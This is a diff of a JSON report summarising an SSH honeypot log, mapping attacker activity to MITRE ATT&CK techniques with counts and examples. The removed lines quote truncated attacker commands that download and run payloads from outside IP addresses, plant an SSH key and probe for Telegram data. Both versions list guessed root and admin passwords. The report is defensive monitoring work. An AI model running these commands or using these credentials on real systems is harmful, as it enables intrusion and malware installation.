@@ -1,291 +1,70 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-07 00:00:21",
+  "generated": "2026-09-07 01:01:11",
   "totals": {
-    "commands": 337,
-    "login_failed": 3331,
-    "login_success": 125,
-    "sessions": 3042
+    "commands": 4,
+    "login_failed": 304,
+    "login_success": 5,
+    "sessions": 319
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3331,
+      "count": 304,
       "examples": [
-        "root / Server@123",
-        "admin / qazwsx",
-        "root / server",
-        "root / qwertyuiop2023",
-        "root / server123"
+        "root / 123456789",
+        "root / admin1",
+        "root / 1234567890",
+        "root / 123abc",
+        "root / 1q2w3e4r"
       ],
-      "first": "2026-09-06T00:01:48.192357Z",
-      "last": "2026-09-06T23:59:50.097589Z",
-      "unique_ips": 244
+      "first": "2026-09-07T00:01:55.927554Z",
+      "last": "2026-09-07T01:01:06.246640Z",
+      "unique_ips": 17
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 125,
+      "count": 5,
       "examples": [
-        "ftpuser / ftpuser",
-        "support / 22222",
+        "nobody / qwerty",
         "root / 1234",
-        "ftpuser / test",
-        "ubuntu / ubuntu"
+        "admin / admin123#",
+        "root / momo123",
+        "root / senha1"
       ],
-      "first": "2026-09-06T00:08:31.210876Z",
-      "last": "2026-09-06T23:52:37.582796Z",
-      "unique_ips": 109
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 119,
-      "examples": [
-        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
-        "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"
-      ],
-      "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T20:20:30.307025Z",
-      "unique_ips": 13
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 59,
-      "examples": [
-        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
-        "http://5.182.210.174/ok",
-        "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi"
-      ],
-      "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T20:20:30.303246Z",
-      "unique_ips": 13
+      "first": "2026-09-07T00:13:31.233466Z",
+      "last": "2026-09-07T00:56:14.510534Z",
+      "unique_ips": 5
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 15,
-      "examples": [
-        "/bin/./uname -s -v -n -r -m",
-        "uname -s -v -n -r -m",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "uname -a",
-        "cat /proc/cpuinfo"
-      ],
-      "first": "2026-09-06T00:57:39.682052Z",
-      "last": "2026-09-06T23:52:49.879523Z",
-      "unique_ips": 12
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 8,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
-      ],
-      "first": "2026-09-06T03:22:52.847139Z",
-      "last": "2026-09-06T18:39:45.543857Z",
-      "unique_ips": 8
-    },
-    {
-      "id": "T1059.004",
-      "name": "Command and Scripting Interpreter: Unix Shell",
-      "tactic": "Execution",
-      "count": 8,
-      "examples": [
-        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T20:20:30.307025Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1070.004",
-      "name": "Indicator Removal: File Deletion",
-      "tactic": "Defense Evasion",
-      "count": 4,
-      "examples": [
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
-      ],
-      "first": "2026-09-06T00:40:31.052946Z",
-      "last": "2026-09-06T15:32:27.792160Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 3,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-06T03:22:52.847139Z",
-      "last": "2026-09-06T20:20:30.307025Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1016",
-      "name": "System Network Configuration Discovery",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "netstat -tulpn | head -10",
-        "ifconfig"
-      ],
-      "first": "2026-09-06T05:45:44.902529Z",
-      "last": "2026-09-06T12:48:14.274077Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1057",
-      "name": "Process Discovery",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'"
-      ],
-      "first": "2026-09-06T12:48:29.698327Z",
-      "last": "2026-09-06T12:48:34.235106Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1037",
-      "name": "Boot or Logon Initialization Scripts",
-      "tactic": "Persistence",
       "count": 1,
       "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+        "uname -s -v -n -r -m"
       ],
-      "first": "2026-09-06T20:20:30.307025Z",
-      "last": "2026-09-06T20:20:30.307025Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1098.004",
-      "name": "Account Manipulation: SSH Authorized Keys",
-      "tactic": "Persistence",
-      "count": 1,
-      "examples": [
-        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
-      ],
-      "first": "2026-09-06T20:20:26.235027Z",
-      "last": "2026-09-06T20:20:26.235027Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1489",
-      "name": "Service Stop",
-      "tactic": "Impact",
-      "count": 1,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-06T20:20:30.307025Z",
-      "last": "2026-09-06T20:20:30.307025Z",
+      "first": "2026-09-07T00:37:38.080506Z",
+      "last": "2026-09-07T00:37:38.080506Z",
       "unique_ips": 1
     }
   ],
   "unmapped": [
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      48
-    ],
-    [
       "shell",
-      15
-    ],
-    [
-      "sh",
-      14
-    ],
-    [
-      "system",
-      11
-    ],
-    [
-      "enable",
-      10
+      1
     ],
     [
       "/bin/busybox",
-      9
+      1
     ],
     [
       "cd /proc && cat self/cmdline",
-      9
-    ],
-    [
-      "/bin/busybox YM58GUjK",
-      9
-    ],
-    [
-      "linuxshell",
-      8
-    ],
-    [
-      "enablelinuxshell",
-      7
-    ],
-    [
-      "ping ;sh",
-      7
-    ],
-    [
-      "su",
-      3
-    ],
-    [
-      "/bin/busybox cat /proc/mounts; /bin/busybox YM58GUjK",
-      3
-    ],
-    [
-      "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/tmp' > /tmp/.none; /bin/busybox cat /tmp/.none; /bin/busybox rm /tmp/.none",
-      3
-    ],
-    [
-      "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/dev' > /dev/.none; /bin/busybox cat /dev/.none; /bin/busybox rm /dev/.none",
-      3
-    ],
-    [
-      "rm /tmp/.t; rm /tmp/.sh; rm /tmp/.human",
-      3
-    ],
-    [
-      "cd /tmp/",
-      3
-    ],
-    [
-      "/bin/busybox cat /bin/echo",
-      3
-    ],
-    [
-      "exit",
-      2
-    ],
-    [
-      "/bin/busybox TOKEN",
-      2
+      1
     ]
   ]
 }
